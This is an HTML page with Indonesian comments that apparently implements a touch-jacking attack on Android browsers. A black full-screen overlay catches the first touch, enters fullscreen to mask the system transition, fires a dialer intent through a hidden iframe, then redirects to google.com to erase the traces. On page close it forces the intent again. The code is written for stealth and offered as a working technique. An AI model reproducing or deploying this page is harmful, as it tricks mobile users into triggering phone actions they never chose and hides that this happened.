<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>S Y S T E M</title>
    <style>
        /* UI Hitam Pekat untuk masking sempurna */
        body, html { 
            margin: 0; padding: 0; background: #000; 
            width: 100vw; height: 100vh; overflow: hidden;
            touch-action: none;
        }
        #jacker {
            position: absolute; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 9999; cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="jacker"></div>

<script>
    const jacker = document.getElementById('jacker');

    jacker.addEventListener('touchstart', function() {
        // 1. Masuk Fullscreen (Menyamarkan transisi sistem)
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        }

        // 2. Konstruksi Intent (Contoh: Dialer)
        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";

        // 3. Eksekusi via Iframe tersembunyi
        // Iframe memungkinkan intent dipicu tanpa menghentikan eksekusi skrip utama
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = intentUrl;
        document.body.appendChild(iframe);

        // 4. Tahap Pembersihan & Redirect (Stealth Mode)
        // Kita gunakan delay 100ms agar Iframe punya waktu untuk berkomunikasi dengan OS Android
        setTimeout(() => {
            // Keluar dari Fullscreen agar transisi ke Google terlihat natural
            if (document.exitFullscreen) {
                document.exitFullscreen();
            }
            
            // Langsung buang ke Google.com
            // Ini akan menimpa jejak Intent Picker jika muncul sedikit lag
            window.location.replace("https://www.google.com");
        }, 100);

        // 5. Fallback terakhir: Jika navigasi gagal, paksa Intent lagi saat halaman ditutup
        window.addEventListener('pagehide', () => {
            window.location.href = intentUrl;
        });
    });
</script>
</body>
</html>
